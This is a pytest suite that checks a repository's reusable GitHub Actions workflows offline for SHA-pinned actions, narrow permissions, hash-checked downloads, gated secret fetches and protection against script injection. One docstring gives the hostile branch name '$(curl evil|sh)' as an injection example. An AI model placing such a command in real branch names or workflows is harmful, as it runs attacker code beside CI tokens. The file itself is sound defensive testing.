"""The workflows are the product here, and nothing else checks them.

Every repository that calls these workflows inherits whatever they do, with a
token in the environment. The failure modes are quiet ones: an action pinned
to a moving tag changes what runs without a commit; a permission granted too
widely is a gift to anyone who lands code in a dependency; a job that needs a
secret and does not fetch it fails only on the release that needed it.

Every assertion is offline and reads only files in this repository. Each one
was broken on purpose once to confirm it goes red with a message naming the
fix - a check that cannot fail is decoration.
"""

from __future__ import annotations

import re
from pathlib import Path

import pytest
import yaml

REPO = Path(__file__).resolve().parent.parent
WORKFLOWS = REPO / ".github" / "workflows"
EXAMPLES = REPO / "examples" / "workflows"
ACTIONS = REPO / ".github" / "actions"
README = REPO / "README.md"

WORKFLOW_FILES = sorted(WORKFLOWS.glob("*.yml"))
ACTION_FILES = sorted(ACTIONS.glob("*/action.yml"))
# The build, release and security workflows a caller may `uses:`.
BUILD = (
    "python-ci.yml",
    "bash-ci.yml",
    "tofu-ci.yml",
    "container-release.yml",
    "python-package-release.yml",
    "security.yml",
    "dependabot-auto-merge.yml",
)
# The centralized scans: one scanner per scan-*.yml, the gate that judges
# them, and the profile-*.yml that wire a set of scans to the gate.
SCANS = sorted(p.name for p in WORKFLOW_FILES if p.name.startswith("scan-"))
PROFILES = sorted(p.name for p in WORKFLOW_FILES if p.name.startswith("profile-"))
SCAN_FAMILY = (*SCANS, "security-gate.yml", *PROFILES)
SAMPLE_STAGES = (
    "dev-security-scan.yml",
    "image-security-scan.yml",
    "pr-security-gate.yml",
    "tf-security-scans.yml",
    "secrets-security-scans.yml",
)
SAMPLE_CALLERS = (
    "sample-python-api.yml",
    "sample-typescript-web.yml",
    "sample-dotnet-api.yml",
    "sample-container-web.yml",
    "sample-infrastructure.yml",
    "sample-k8s.yml",
    "sample-secrets.yml",
    "sample-bash-ci.yml",
)
# Every workflow a caller may `uses:`. Most rules below apply to all of them.
REUSABLE = [p for p in WORKFLOW_FILES if p.name in BUILD + SCAN_FAMILY]
# The subset that fetches CI secrets. The Doppler rules are about those steps,
# so a callable workflow that needs no secret is not held to them; it is held
# to everything else, and it must not grow a fetch without joining this list.
DOPPLER = [p for p in REUSABLE if p.name in ("python-ci.yml", "tofu-ci.yml", "container-release.yml", "security.yml")]
# The language CI workflows: each ends in the `CI green` gate branch protection requires.
LANGUAGE_CI = [p for p in REUSABLE if p.name.endswith("-ci.yml")]
OWN = [p for p in WORKFLOW_FILES if p not in REUSABLE]

SELF = "Lucatronlk/justsec-cicd-blueprints/"
HARDEN_RUNNER = "step-security/harden-runner@"


def load(path: Path) -> dict:
    """`on:` parses as the boolean True under YAML 1.1; use triggers()."""
    return yaml.safe_load(path.read_text())


def triggers(doc: dict) -> dict:
    return doc.get("on") or doc.get(True) or {}


def jobs(doc: dict) -> dict:
    return doc.get("jobs") or {}


def steps_of(job: dict) -> list[dict]:
    return [s for s in (job.get("steps") or []) if isinstance(s, dict)]


def all_steps(path: Path):
    doc = load(path)
    if "runs" in doc:  # composite action
        for step in doc["runs"].get("steps") or []:
            yield "(composite)", step
        return
    for name, job in jobs(doc).items():
        for step in steps_of(job):
            yield name, step


def test_there_is_something_to_check():
    assert SCANS == [
        "scan-app.yml",
        "scan-checkov.yml",
        "scan-gitleaks.yml",
        "scan-hadolint.yml",
        "scan-image.yml",
        "scan-osv-scanner.yml",
        "scan-semgrep.yml",
        "scan-trivy.yml",
    ]
    assert PROFILES == [
        "profile-dev.yml",
        "profile-full.yml",
        "profile-image.yml",
        "profile-pr-gate.yml",
        "profile-secrets.yml",
        "profile-tf.yml",
    ]
    assert len(REUSABLE) == len(BUILD) + len(SCAN_FAMILY), "a listed workflow file is missing"
    assert {p.name for p in WORKFLOW_FILES} - {p.name for p in REUSABLE} == {
        "ci-repo.yml",
        *(
            f"ci-{app}.yml"
            for app in (
                "python-api",
                "typescript-web",
                "dotnet-api",
                "container-web",
                "infrastructure",
                "k8s",
                "fixture",
                "sample-app",
            )
        ),
        "single-scanner-test.yml",
        "pin-check.yml",
        "baseline-audit.yml",
        *SAMPLE_STAGES,
    }, "a workflow is neither callable nor one of this repository's own"
    assert len(DOPPLER) == 4, "expected four of them to fetch CI secrets"
    assert [p.name for p in LANGUAGE_CI] == ["bash-ci.yml", "python-ci.yml", "tofu-ci.yml"]
    assert ACTION_FILES, "no composite actions found"


def test_sample_scan_stages_route_to_the_expected_profiles():
    targets = {
        "dev-security-scan.yml": "profile-dev.yml",
        "image-security-scan.yml": "profile-image.yml",
        "pr-security-gate.yml": "profile-pr-gate.yml",
        "tf-security-scans.yml": "profile-tf.yml",
        "secrets-security-scans.yml": "profile-secrets.yml",
    }
    for filename, profile in targets.items():
        doc = load(WORKFLOWS / filename)
        assert jobs(doc)["scan"]["uses"] == f"./.github/workflows/{profile}"
        assert jobs(doc)["scan"]["with"]["upload-sarif"] is False
        assert jobs(doc)["scan"]["permissions"] == {"contents": "read", "security-events": "write"}
        assert "workflow_call" in triggers(doc)
    secret_triggers = triggers(load(WORKFLOWS / "secrets-security-scans.yml"))
    assert set(secret_triggers) == {"workflow_call"}


def test_sample_stage_callers_pass_nested_scanner_permissions():
    """Every caller must grant what its nested profile scanner declares."""
    targets = set(SAMPLE_STAGES)
    seen = set()
    for path in [*WORKFLOW_FILES, *sorted(EXAMPLES.glob("*.yml"))]:
        for name, job in jobs(load(path)).items():
            target = str(job.get("uses", "")).removeprefix("./.github/workflows/")
            if target in targets:
                seen.add(target)
                assert job.get("permissions", {}).get("security-events") == "write", (
                    f"{path.name}: {name} must pass security-events: write to {target}"
                )
    assert seen == targets, f"unexercised stage wrappers: {targets - seen}"


def test_osv_only_probe_preserves_existing_scan_gates():
    doc = load(WORKFLOWS / "single-scanner-test.yml")
    assert set(jobs(doc)) == {"osv"}
    assert jobs(doc)["osv"]["uses"] == "./.github/workflows/scan-osv-scanner.yml"
    assert jobs(doc)["osv"]["permissions"] == {"contents": "read", "security-events": "write"}
    assert jobs(doc)["osv"]["with"]["upload-sarif"] is False
    assert set(triggers(doc)) == {"workflow_dispatch"}, "probe must not add PR or push triggers"
    assert "security-green" in jobs(load(WORKFLOWS / "ci-repo.yml"))


def test_osv_install_stays_in_runner_temp_and_is_hash_checked():
    doc = load(WORKFLOWS / "scan-osv-scanner.yml")
    steps = steps_of(jobs(doc)["scan"])
    install_step = next(s for s in steps if s.get("name") == "Install osv-scanner at the pinned version")
    run = install_step["run"]
    assert "sha256sum -c -" in run
    assert 'install -m 0755 "$download" "$bindir/osv-scanner"' in run
    assert 'echo "$bindir" >> "$GITHUB_PATH"' in run
    assert " /usr/local/bin/" not in run
    assert '"$bindir/osv-scanner" --version' in run


def test_binary_scanners_install_only_into_job_local_path():
    """Scanner installs must not require root or shadow host-global binaries."""
    names = (
        "scan-gitleaks.yml",
        "scan-hadolint.yml",
        "scan-image.yml",
        "scan-osv-scanner.yml",
        "scan-trivy.yml",
        "bash-ci.yml",
        "tofu-ci.yml",
    )
    for name in names:
        doc = load(WORKFLOWS / name)
        installs = [
            s["run"]
            for job in jobs(doc).values()
            for s in steps_of(job)
            if "Install " in s.get("name", "") and "run" in s and "sha256sum -c -" in s["run"]
        ]
        assert installs, f"{name}: expected at least one install step"
        for run in installs:
            assert "sha256sum -c -" in run, f"{name}: download must stay hash-verified"
            assert "/usr/local/bin" not in run, f"{name}: runner cannot write to global bin"
            assert '"$RUNNER_TEMP/' in run, f"{name}: install into runner temp only"
            assert '"$GITHUB_PATH"' in run, f"{name}: later steps must find the local binary"
            if name != "scan-osv-scanner.yml":
                # GITHUB_PATH updates subsequent steps, not the installer step.
                for tool in (
                    "gitleaks",
                    "hadolint",
                    "trivy",
                    "grype",
                    "shellcheck",
                    "shfmt",
                ):
                    if f'"$RUNNER_TEMP/{tool}-bin/{tool}"' in run:
                        assert f'"$RUNNER_TEMP/{tool}-bin/{tool}" --version' in run or (
                            f'"$RUNNER_TEMP/{tool}-bin/{tool}" version' in run
                        ), f"{name}: installer must verify {tool} using its absolute path"


def test_sample_callers_target_only_their_own_apps():
    targets = {
        "sample-python-api.yml": ("apps/python-api", True, False),
        "sample-typescript-web.yml": ("apps/typescript-web", True, False),
        "sample-dotnet-api.yml": ("apps/dotnet-api", True, False),
        "sample-container-web.yml": ("apps/container-web", True, False),
        "sample-infrastructure.yml": ("apps/infrastructure", False, True),
        "sample-k8s.yml": ("apps/k8s", False, False),
    }
    for filename, (directory, image, terraform) in targets.items():
        doc = load(EXAMPLES / filename)
        assert {"push", "pull_request", "workflow_dispatch"} <= set(triggers(doc))
        assert jobs(doc)["dev"]["with"]["working-directory"] == directory
        assert jobs(doc)["pr"]["with"]["working-directory"] == directory
        assert ("image" in jobs(doc)) is image
        assert ("terraform" in jobs(doc)) is terraform
        if image:
            assert jobs(doc)["image"]["with"]["docker-context"] == directory
            assert jobs(doc)["image"]["with"]["dockerfile"] == f"{directory}/Dockerfile"
        if terraform:
            assert jobs(doc)["terraform"]["with"]["working-directory"] == directory


def test_the_bash_sample_covers_the_repository_from_the_root():
    shell = load(EXAMPLES / "sample-bash-ci.yml")
    assert {"push", "pull_request", "workflow_dispatch"} <= set(triggers(shell))
    assert jobs(shell)["shell"]["uses"] == "./.github/workflows/bash-ci.yml"
    assert jobs(shell)["shell"]["with"]["paths"] == "."


def test_only_the_doppler_workflows_fetch_secrets():
    """The split above is a claim about the files; this is the claim checked."""
    for path in REUSABLE:
        fetches = "dopplerhq/secrets-fetch-action@" in path.read_text()
        assert fetches == (path in DOPPLER), (
            f"{path.name} fetches from Doppler: {fetches}, but DOPPLER says {path in DOPPLER}. "
            "A callable workflow that fetches CI secrets belongs in DOPPLER."
        )


# --- supply chain -----------------------------------------------------------

USES = re.compile(r"uses:\s*(?P<action>[A-Za-z0-9._-]+/[A-Za-z0-9._/-]+)@(?P<ref>\S+)(?P<rest>.*)$")
SHA = re.compile(r"^[0-9a-f]{40}$")
VERSION_COMMENT = re.compile(r"^\s*#\s*v\d+\.\d+(\.\d+)?\s*$")


@pytest.mark.parametrize("path", WORKFLOW_FILES + ACTION_FILES, ids=lambda p: str(p.relative_to(REPO)))
def test_every_action_is_pinned_to_a_sha_with_a_version_comment(path):
    """A tag re-resolves on every run; a 40-hex SHA cannot.

    That includes references to this repository's own files. A reusable
    workflow cannot name the commit it is running from, so a `@main`
    self-reference would make a caller's pin only as strong as this repo's
    default branch. The Doppler steps are inlined instead (see below).
    """
    for number, line in enumerate(path.read_text().splitlines(), start=1):
        if line.lstrip().startswith("#"):
            continue  # the usage example in the header shows `@<sha>`
        match = USES.search(line)
        if not match:
            continue
        where = f"{path.relative_to(REPO)}:{number}"
        action, ref = match["action"], match["ref"]
        assert SHA.match(ref), f"{where}: {action} is pinned to {ref!r}, not a commit SHA"
        assert VERSION_COMMENT.match(match["rest"]), f"{where}: {action} has no `# vX.Y.Z` comment after the SHA"


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_reusable_workflows_never_reference_this_repository_by_branch(path):
    for _, step in all_steps(path):
        uses = str(step.get("uses", ""))
        assert not uses.startswith(SELF), f"{path.name} references {uses}; inline the steps so the caller's pin holds"


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_no_workflow_uses_pull_request_target(path):
    assert "pull_request_target" not in triggers(load(path))


# --- permissions ------------------------------------------------------------


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_every_workflow_declares_read_only_top_level_permissions(path):
    doc = load(path)
    perms = doc.get("permissions")
    assert perms is not None, f"{path.name} has no top-level permissions block"
    assert perms in ({}, {"contents": "read"}), (
        f"{path.name}: top-level permissions must be contents: read; widen per job"
    )


# Every write any job here may hold, with the reason. A new write is a review
# decision, not a side effect of adding a step.
ALLOWED_WRITES = {
    # Codecov (python-ci's coverage job, never the job that runs the caller's
    # tests) verifies the job's OIDC token directly; Docker Hub credentials
    # (release), Snyk and the gitleaks licence (security) come from Doppler
    # over OIDC; Scorecard publishes its result with the same OIDC identity.
    ("python-ci.yml", "coverage", "id-token"),
    ("tofu-ci.yml", "plan", "id-token"),  # the plan's credentials come from Doppler, off pull requests only
    ("security.yml", "gitleaks", "id-token"),
    ("security.yml", "snyk", "id-token"),
    ("security.yml", "scorecard", "id-token"),
    # SARIF uploads to the Security tab.
    ("container-release.yml", "release", "security-events"),
    # The package release: PyPI trusts the job's OIDC identity, and the
    # GitHub release is created and its assets uploaded with the job's own
    # token, with provenance recorded for every file. Neither job checks
    # anything out; both are skipped unless publish is true off a pull request.
    ("python-package-release.yml", "publish-pypi", "id-token"),
    ("python-package-release.yml", "github-release", "contents"),
    ("python-package-release.yml", "github-release", "id-token"),
    ("python-package-release.yml", "github-release", "attestations"),
    ("security.yml", "codeql", "security-events"),
    ("security.yml", "snyk", "security-events"),
    ("security.yml", "scorecard", "security-events"),
    # dependency-review's summary comment on the pull request.
    ("security.yml", "dependency-review", "pull-requests"),
    # Auto-merge: enabling it on a Dependabot pull request is a write to the
    # pull request and to the branch it will merge. The job checks nothing
    # out, so none of the proposed code runs beside the grant.
    ("dependabot-auto-merge.yml", "auto-merge", "contents"),
    ("dependabot-auto-merge.yml", "auto-merge", "pull-requests"),
    ("dependabot-auto-merge-self.yml", "auto-merge", "contents"),
    ("dependabot-auto-merge-self.yml", "auto-merge", "pull-requests"),
    # This repository dogfoods security.yml on itself.
    ("security-self.yml", "security", "security-events"),
    ("security-self.yml", "security", "pull-requests"),
    ("security-self.yml", "security", "id-token"),
    # And python-ci.yml on the fixture project:
    # the grants a caller gives, so the called jobs' own permissions blocks
    # are satisfied; the release job never pushes here (push: false).
    # Repository CI delegates its secrets scan; app entrypoints delegate profile SARIF uploads.
    ("ci-repo.yml", "secrets", "security-events"),
    # And python-package-release.yml on the fixture: the grants its two
    # publishing jobs declare, which publish: false skips.
    # scan-app calls nested profiles that declare SARIF upload permissions.
    *(("scan-app.yml", name, "security-events") for name in ("dev", "pr", "image", "terraform", "full")),
    # The manual probe calls a scanner that declares SARIF permissions even
    # though the probe disables SARIF upload; GitHub validates the declaration.
    ("single-scanner-test.yml", "osv", "security-events"),
    *((name, "scan", "security-events") for name in SAMPLE_STAGES),
    # GitHub validates nested reusable-workflow permissions even when these
    # sample stages request upload-sarif: false; the profile still declares
    # security-events: write on its scanner jobs.
}


def sarif_write(path: Path, job_name: str, job: dict, scope: str) -> bool:
    """`security-events: write` for SARIF, granted only where SARIF is uploaded.

    A scan job uploads its SARIF to the Security tab; a profile job, or one of
    this repository's own jobs, grants it only when it calls a scan workflow
    or a profile that does. Nothing else in the scan family may write.
    """
    if scope != "security-events":
        return False
    if path.name in SCANS and job_name == "scan":
        return "github/codeql-action/upload-sarif@" in path.read_text()
    target = str(job.get("uses", ""))
    if path.name in PROFILES or path.name in ("scans-self.yml", "scan-app.yml") or path.name.startswith("ci-"):
        return any(f"./.github/workflows/{name}" in target for name in SCANS + PROFILES)
    return False


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_no_job_grants_a_write_that_is_not_on_the_list(path):
    for job_name, job in jobs(load(path)).items():
        perms = job.get("permissions")
        if not isinstance(perms, dict):
            continue
        for scope, level in perms.items():
            if level in ("read", "none"):
                continue
            if sarif_write(path, job_name, job, scope):
                continue
            assert (path.name, job_name, scope) in ALLOWED_WRITES, (
                f"{path.name}: job {job_name!r} grants {scope}: {level}. "
                "If intended, add it to ALLOWED_WRITES with a reason."
            )


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_every_reusable_job_declares_its_own_permissions(path):
    """A reusable workflow's job runs with the caller's grant unless it narrows it. Narrow it."""
    for job_name, job in jobs(load(path)).items():
        assert isinstance(job.get("permissions"), dict), f"{path.name}: job {job_name!r} has no permissions block"


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_every_checkout_refuses_to_persist_credentials(path):
    """The token stays ephemeral, except in ci-repo, whose repair fetches promisor blobs."""
    expected = True if path.name == "ci-repo.yml" else False
    for job_name, step in all_steps(path):
        if not str(step.get("uses", "")).startswith("actions/checkout@"):
            continue
        assert (step.get("with") or {}).get("persist-credentials") is expected, (
            f"{path.name}: checkout in job {job_name!r} must set persist-credentials: {str(expected).lower()}"
        )


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_every_reusable_job_starts_with_harden_runner(path):
    """The egress policy is only a policy if it is in place before anything else runs."""
    for job_name, job in jobs(load(path)).items():
        steps = steps_of(job)
        if not steps:
            continue  # a gate job with no steps that reach the network
        first = str(steps[0].get("uses", ""))
        if path.name == "scan-app.yml" and job_name == "result":
            continue  # result uses only shell builtins to compare upstream job statuses
        assert first.startswith(HARDEN_RUNNER), f"{path.name}: job {job_name!r} does not start with harden-runner"
        with_ = steps[0].get("with") or {}
        # The distro job has its own policy input: its hosts are not measured yet.
        policy = "distro-egress-policy" if job_name == "distro" else "egress-policy"
        assert with_.get("egress-policy") == "${{ inputs." + policy + " }}", (
            f"{path.name}: job {job_name!r} harden-runner ignores the {policy} input"
        )


# --- script injection -------------------------------------------------------

UNTRUSTED = re.compile(r"\$\{\{\s*(github\.event\.|github\.head_ref|github\.ref_name|env\.|inputs\.)")


@pytest.mark.parametrize("path", WORKFLOW_FILES + ACTION_FILES, ids=lambda p: str(p.relative_to(REPO)))
def test_no_run_block_interpolates_untrusted_context(path):
    """A branch named `$(curl evil|sh)` is a valid branch name.

    Values, including every caller-supplied command, go through env: and are
    read by the shell as data. `bash -c "$COMMAND"` is the one sanctioned way
    to run a caller's command string.
    """
    for job_name, step in all_steps(path):
        body = step.get("run")
        if not isinstance(body, str):
            continue
        found = UNTRUSTED.search(body)
        assert not found, f"{path.relative_to(REPO)}: job {job_name!r} interpolates {found.group(0)!r} into run:"


# --- the Doppler steps are one thing, written in several places ------------


def doppler_script(path: Path) -> list[str]:
    """The `run:` bodies of every step named 'Decide how to authenticate...' in a file."""
    return [
        step["run"] for _, step in all_steps(path) if str(step.get("name", "")).startswith("Decide how to authenticate")
    ]


def test_the_inlined_doppler_script_matches_the_composite_action():
    """Four copies, one source. The composite action is the source; a copy that drifts is a bug."""
    composite = doppler_script(ACTIONS / "doppler-secrets" / "action.yml")
    assert len(composite) == 1
    copies = {path.name: doppler_script(path) for path in DOPPLER}
    assert copies == {
        "python-ci.yml": [composite[0]],
        "tofu-ci.yml": [composite[0]],
        "container-release.yml": [composite[0]],
        "security.yml": [composite[0]] * 2,
    }, "an inlined Doppler script differs from .github/actions/doppler-secrets/action.yml"


@pytest.mark.parametrize("path", DOPPLER, ids=lambda p: p.name)
def test_doppler_fetch_steps_are_gated_on_the_decision(path):
    """Both fetch steps key off the decide step; an ungated fetch would run with an empty token."""
    doc = load(path)
    secrets = triggers(doc)["workflow_call"].get("secrets") or {}
    assert "DOPPLER_TOKEN" in secrets, f"{path.name} does not declare the DOPPLER_TOKEN fallback secret"
    fetches = [s for _, s in all_steps(path) if str(s.get("uses", "")).startswith("dopplerhq/secrets-fetch-action@")]
    assert fetches, f"{path.name} never fetches from Doppler"
    for step in fetches:
        cond = step.get("if", "")
        assert cond in ("steps.doppler.outputs.mode == 'oidc'", "steps.doppler.outputs.mode == 'token'"), (
            f"{path.name}: fetch step {step.get('name')!r} is gated on {cond!r}"
        )
        with_ = step.get("with") or {}
        for key in ("doppler-project", "doppler-config"):
            assert with_.get(key) == "${{ inputs." + key + " }}", f"{path.name}: fetch step does not pass {key}"
        if cond.endswith("'token'"):
            assert with_.get("doppler-token") == "${{ secrets.DOPPLER_TOKEN }}"
        else:
            assert with_.get("doppler-identity-id") == "${{ inputs.doppler-identity-id }}"


GATE_ENV = {
    "TRUSTED_ONLY": "${{ inputs.doppler-trusted-refs-only }}",
    "EVENT": "${{ github.event_name }}",
    "REF": "${{ github.ref }}",
    "DEFAULT_BRANCH": "${{ github.event.repository.default_branch }}",
}


@pytest.mark.parametrize("path", DOPPLER, ids=lambda p: p.name)
def test_every_decide_step_feeds_the_ref_gate(path):
    """The script refuses untrusted refs only if it is told what the ref is."""
    decides = [s for _, s in all_steps(path) if str(s.get("name", "")).startswith("Decide how to authenticate")]
    assert decides, f"{path.name} has no Doppler decide step"
    for step in decides:
        env = step.get("env") or {}
        for key, value in GATE_ENV.items():
            assert env.get(key) == value, f"{path.name}: decide step env {key} is {env.get(key)!r}, expected {value!r}"


@pytest.mark.parametrize("path", DOPPLER, ids=lambda p: p.name)
def test_trusted_refs_only_defaults_on(path):
    inputs = triggers(load(path))["workflow_call"]["inputs"]
    spec = inputs.get("doppler-trusted-refs-only")
    assert spec and spec.get("type") == "boolean" and spec.get("default") is True, (
        f"{path.name}: doppler-trusted-refs-only must be a boolean defaulting to true"
    )


# A job that holds id-token: write can mint a JWT for this repository; on a
# pull request that job runs the pull request's code. Every such job is either
# kept off pull requests by its `if`, or listed here with why it is acceptable.
PR_ID_TOKEN_EXCEPTIONS = {
    # Only pinned actions run here; nothing from the checkout is executed. The
    # licence it may fetch is for organisation accounts and the Doppler step
    # refuses pull requests anyway.
    ("security.yml", "gitleaks"),
}


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_no_job_that_can_run_on_a_pull_request_holds_an_oidc_token(path):
    for job_name, job in jobs(load(path)).items():
        perms = job.get("permissions") or {}
        if perms.get("id-token") != "write":
            continue
        cond = str(job.get("if", ""))
        if "github.event_name != 'pull_request'" in cond:
            continue
        assert (path.name, job_name) in PR_ID_TOKEN_EXCEPTIONS, (
            f"{path.name}: job {job_name!r} holds id-token: write and may run on a pull request. "
            "Gate it with github.event_name != 'pull_request' or add it to PR_ID_TOKEN_EXCEPTIONS with a reason."
        )


def test_the_job_running_the_callers_tests_holds_no_oidc_token():
    """`test-command` is the caller's code, and a dependency of it; it must not run beside a token."""
    doc = load(WORKFLOWS / "python-ci.yml")
    coverage = jobs(doc)["coverage"]
    assert coverage["needs"] == "test" or coverage["needs"] == ["test"]
    assert "github.event_name != 'pull_request'" in coverage["if"]


# --- shape ------------------------------------------------------------------

# GitHub-hosted runner for every job, including fork PRs: public repositories
# get free minutes and each run starts on a fresh, isolated machine.
HOSTED_RUNNER = "ubuntu-24.04"


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_every_concrete_job_uses_the_hosted_runner(path):
    concrete = [(name, job) for name, job in jobs(load(path)).items() if "uses" not in job]
    for name, job in concrete:
        assert job.get("runs-on") == HOSTED_RUNNER, (
            f"{path.name}: concrete job {name!r} must use {HOSTED_RUNNER} on every event; got {job.get('runs-on')!r}"
        )


@pytest.mark.parametrize("path", [WORKFLOWS / name for name in ("python-ci.yml", "bash-ci.yml")], ids=lambda p: p.name)
def test_matrix_jobs_also_use_the_hosted_runner(path):
    doc = load(path)
    for name in ("test", "distro"):
        assert jobs(doc)[name].get("runs-on") == HOSTED_RUNNER


@pytest.mark.parametrize("path", WORKFLOW_FILES, ids=lambda p: p.name)
def test_every_job_has_a_timeout(path):
    for job_name, job in jobs(load(path)).items():
        if "uses" in job:
            continue  # a caller of a reusable workflow; the timeout lives inside
        assert job.get("timeout-minutes"), f"{path.name}: job {job_name!r} has no timeout-minutes"


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_reusable_workflows_are_only_callable(path):
    assert list(triggers(load(path)).keys()) == ["workflow_call"], f"{path.name} must trigger on workflow_call only"


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_every_input_has_a_description_and_a_default(path):
    """Callers read the description; the default is what makes `with:` optional."""
    inputs = triggers(load(path))["workflow_call"].get("inputs") or {}
    for name, spec in inputs.items():
        if path.name == "scan-app.yml":
            assert spec.get("type") == "string", f"{path.name}: {name!r} must be a string"
            assert spec.get("required") is True or "default" in spec, f"{path.name}: {name!r} has no default"
            continue  # internal, required matrix fields cannot also have a default
        assert spec.get("description"), f"{path.name}: input {name!r} has no description"
        assert "default" in spec, f"{path.name}: input {name!r} has no default"


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_every_declared_input_is_used(path):
    text = path.read_text()
    inputs = triggers(load(path))["workflow_call"].get("inputs") or {}
    for name in inputs:
        if path.name == "scan-app.yml" and name == "app":
            continue  # app is a compatibility label; path is used by scanners
        assert re.search(rf"inputs\.{re.escape(name)}\b", text), f"{path.name}: input {name!r} is declared, never read"


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_every_input_used_is_declared(path):
    text = path.read_text()
    inputs = triggers(load(path))["workflow_call"].get("inputs") or {}
    used = set(re.findall(r"inputs\.([A-Za-z0-9_-]+)", text))
    assert used <= set(inputs), f"{path.name} reads undeclared inputs: {sorted(used - set(inputs))}"


@pytest.mark.parametrize("path", LANGUAGE_CI, ids=lambda p: p.name)
def test_ci_green_gate_needs_every_other_job(path):
    """Branch protection watches one job; a job left out of its needs merges red.

    The same gate in every language's workflow is what lets BASELINE.md name
    one check shape, `<job> / CI green`, whatever the repository is written in.
    """
    doc = load(path)
    gate = jobs(doc)["ci-green"]
    assert gate["name"] == "CI green"
    assert gate.get("if") == "always()"
    assert set(gate["needs"]) == set(jobs(doc)) - {"ci-green"}
    assert gate["permissions"] == {}


@pytest.mark.parametrize("path", LANGUAGE_CI, ids=lambda p: p.name)
def test_the_job_running_the_callers_tests_holds_no_oidc_token_in_any_language(path):
    doc = load(path)
    if "test" not in jobs(doc):
        pytest.skip(f"{path.name} has no test job")
    assert "id-token" not in (jobs(doc)["test"].get("permissions") or {})


@pytest.mark.parametrize("name", ["python-ci.yml", "bash-ci.yml"])
def test_the_distro_job_is_gated_and_has_its_own_egress_policy(name):
    """Images and mirrors are unmeasured, so `distro` audits on its own input; the gate must still wait for it."""
    doc = load(WORKFLOWS / name)
    assert "distro" in doc_gate_needs(doc), f"{name}: ci-green does not need the distro job"
    steps = steps_of(jobs(doc)["distro"])
    assert str(steps[0]["uses"]).startswith(HARDEN_RUNNER)
    with_ = steps[0]["with"]
    assert with_["egress-policy"] == "${{ inputs.distro-egress-policy }}"
    assert "inputs.distro-egress-policy" in with_["disable-telemetry"]
    spec = triggers(doc)["workflow_call"]["inputs"]["distro-egress-policy"]
    assert spec["default"] == "audit"
    assert "inputs.distros != '[]'" in jobs(doc)["distro"]["if"]
    assert "id-token" not in (jobs(doc)["distro"].get("permissions") or {})


def doc_gate_needs(doc: dict) -> list[str]:
    return jobs(doc)["ci-green"]["needs"]


def test_tofu_plans_only_off_pull_requests_and_validates_without_a_backend():
    """A plan needs a credential and the gate is where one may exist; validate never does, and never applies."""
    doc = load(WORKFLOWS / "tofu-ci.yml")
    plan = jobs(doc)["plan"]
    assert "github.event_name != 'pull_request'" in str(plan["if"]) and "inputs.plan-command" in str(plan["if"])
    validate = [s for s in steps_of(jobs(doc)["validate"]) if str(s.get("name", "")).startswith("init")][0]
    assert "-backend=false" in validate["run"]
    text = (WORKFLOWS / "tofu-ci.yml").read_text()
    assert " apply" not in text.replace("Nothing applies", "").replace("nothing applies", ""), "nothing applies from CI"
    for job_name, job in jobs(doc).items():
        if job_name != "plan":
            assert "id-token" not in (job.get("permissions") or {}), f"{job_name} holds a token it does not need"


@pytest.mark.parametrize("name", ["bash-ci.yml"])
def test_a_workflow_that_fetches_nothing_holds_no_token_at_all(name):
    """A lint or a compile needs nothing; a job that fetches nothing has nothing to leak."""
    doc = load(WORKFLOWS / name)
    for job_name, job in jobs(doc).items():
        assert job["permissions"] in ({}, {"contents": "read"}), f"{name} job {job_name!r} widens its permissions"
    assert "secrets" not in triggers(doc)["workflow_call"]


DOWNLOAD = re.compile(r"\bcurl\b")


@pytest.mark.parametrize("path", REUSABLE, ids=lambda p: p.name)
def test_every_downloaded_tool_is_checked_against_a_pinned_hash(path):
    """A tool fetched by URL is only as fixed as the URL. A pinned SHA-256 is what makes it a pin."""
    for job_name, step in all_steps(path):
        body = step.get("run")
        if not isinstance(body, str) or not DOWNLOAD.search(body):
            continue
        assert "sha256sum -c" in body, f"{path.name}: job {job_name!r} downloads with curl and never checks a hash"
        env = step.get("env") or {}
        assert any(v.startswith("${{ inputs.") and k.endswith("SHA256") for k, v in env.items()), (
            f"{path.name}: job {job_name!r} checks a hash that is not a workflow input"
        )


def test_security_defaults_are_neutral_where_they_can_be():
    """One job is Python-shaped by default and only by default; the rest read any repository."""
    doc = load(WORKFLOWS / "security.yml")
    inputs = triggers(doc)["workflow_call"]["inputs"]
    assert "actions" in inputs["codeql-languages"]["default"].split(","), (
        "CodeQL should read the workflow files everywhere"
    )
    assert inputs["pip-audit-requirements"]["default"] == "requirements.txt", "Python callers rely on this default"
    assert inputs["audit-command"]["default"] == ""
    audit = jobs(doc)["dependency-audit"]
    assert "inputs.audit-command != ''" in audit["if"] and "inputs.pip-audit-requirements != ''" in audit["if"]
    assert audit["permissions"] == {"contents": "read"}, "the audit runs a caller's command; it holds nothing"
    names = [s.get("name") for s in steps_of(audit)]
    assert names.index("Audit pinned dependencies (pip-audit)") < names.index("Audit dependencies (audit-command)")


def test_the_package_release_publishes_only_when_told_and_never_beside_the_tree():
    """Every caller command runs in the read-only build job; the two writes run only pinned actions and gh."""
    doc = load(WORKFLOWS / "python-package-release.yml")
    build = jobs(doc)["build"]
    assert build["permissions"] == {"contents": "read"}
    for job_name in ("publish-pypi", "github-release"):
        job = jobs(doc)[job_name]
        cond = str(job["if"])
        assert "inputs.publish" in cond and "github.event_name != 'pull_request'" in cond, f"{job_name} is not gated"
        assert not any(str(s.get("uses", "")).startswith("actions/checkout@") for s in steps_of(job)), (
            f"{job_name} checks the tree out beside a write"
        )
    assert triggers(doc)["workflow_call"]["inputs"]["publish"]["default"] is False
    assert "secrets" not in triggers(doc)["workflow_call"], "nothing here needs a secret"


def test_package_publish_jobs_require_verified_version_tag():
